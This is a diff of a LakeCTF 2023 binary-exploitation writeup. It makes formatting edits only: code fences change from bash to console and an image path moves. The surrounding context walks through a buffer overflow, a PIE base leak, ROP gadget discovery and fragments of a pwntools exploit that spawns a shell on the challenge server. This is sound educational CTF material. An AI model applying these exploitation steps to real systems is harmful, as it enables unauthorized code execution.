@@ -8,7 +8,7 @@ classes: wide
 toc: true
 excerpt: LakeCTF 2023 writeup for the Scream Into The Abyss binary exploitation challenge.
 header:
-    teaser: "/assets/images/lake-ctf.png"
+    teaser: "/assets/images/headers/lake-ctf.png"
 ---
 We are given the following files:
 - nc chall.polygl0ts.ch 9001
@@ -17,7 +17,7 @@ We are given the following files:
 
 # Writeup
 Lets see what we are dealing with and list the protections that are enabled:
-```bash
+```console
 $ checksec abyss_scream
 [*] '../LakeCTF/pwn_abyss/abyss_scream'
     Arch:     amd64-64-little
@@ -77,7 +77,7 @@ When we run the program and enter `x`, we get into the `save_msg` function that 
 ## Finding the Offset
 We can create a cyclic pattern and calculate the offset to our return address. Lets open GDB and enter our payload after it asks us to input our message.
 Because the binary does a call to `system(date)`, we can't debug after this call and have to jump past it. First we disassemble the `save_msg` function to find where we can set a breakpoint.
-```bash
+```console
 pwndbg> disass save_msg
 ...
 0x000000000000128f <+134>:	call   0x1110 <fflush@plt>
@@ -91,18 +91,17 @@ pwndbg> disass save_msg
 ...
 ```
 We will set a breakpoint right before the system call and then jump to `save_msg+154`:
-```bash
+```console
 pwndbg> b *save_msg+146
 pwndbg> b *save_msg+219
 pwndbg> r
-
 pwndbg> jump *save_msg+154
 
 Continuing at 0x5555555552a3.
 Saved score of 0 for x. Date and Time: Now please add a message: 
 ```
 Now we can enter our cyclic pattern in the prompt and inpect the `RSP` to calculate our offset:
-```bash
+```console
 *RBP  0x6361617463616173 ('saactaac')
 *RSP  0x7fffffffdf08 ◂— 'uaacvaacwaacxaacyaac'
 *RIP  0x55555555531d (save_msg+276) ◂— ret 
@@ -133,10 +132,9 @@ payload = flat({
 p.sendlineafter(b'message: ', payload)
 ```
 Demonstrating that it works:
-```bash
+```console
 $ python3 exploit.py
 $ sudo dmesg | tail -n 2
-
 [ 1202.784357] abyss_scream[6648]: segfault at deadbeef ip 00000000deadbeef sp 00007ffefe45a900 error 14
 [ 1202.784384] Code: Unable to access opcode bytes at 0xdeadbec5.
 ```
@@ -183,7 +181,7 @@ We try looking for addresses starting with `0x55`, and we find a few that might 
 43 b'0x55e4378d139e\n'
 ```
 We inspect them in gdb one by one and come to the following conclusions:
-```bash
+```console
 # 41th address points to the beginning of our name input
 pwndbg> x/s 0x561bf357a6c0
 0x561bf357a6c0:	"bytebl33d"
@@ -208,23 +206,20 @@ piebase = main_addr - context.binary.symbols["main"]
 info(f'PIE base @ {hex(piebase)}')
 ```
 With this code we can calculate the pie base address:
-```bash
+```console
 $ python3 exploit.py 
-
 main (symbols) @ 4894
 [*] main_addr @ 0x55870bfb131e
 [*] PIE base @ 0x55870bfb0000
 ```
 ### Finding useful instructions
 We will need a `pop rdi` and `ret` gadget that we can find in gdb or with ropper. The reason fo the `ret` gadget is that when we perform our buffer overflow, we have to realign the stack before continuing our chain. When `ret` is invoked, it increments `$rsp` by 8. Thus, you can simply add a dummy ret to make `$rsp` 16-byte aligned.
-```bash
+```console
 $ ropper --file abyss_scream --search "pop rdi"
-
 [INFO] File: abyss_scream
 0x00000000000013b5: pop rdi; ret; 
 
 $ ropper --file abyss_scream --search "ret"
-
 [INFO] File: abyss_scream
 0x000000000000101a: ret;
 ```
@@ -321,7 +316,7 @@ p.interactive()
 p.close()
 ```
 And when executing the script we get a shell:
-```bash 
+```console 
 $ python3 exploit.py
 [+] Opening connection to chall.polygl0ts.ch on port 9001: Done
 main (symbols) @ 4894
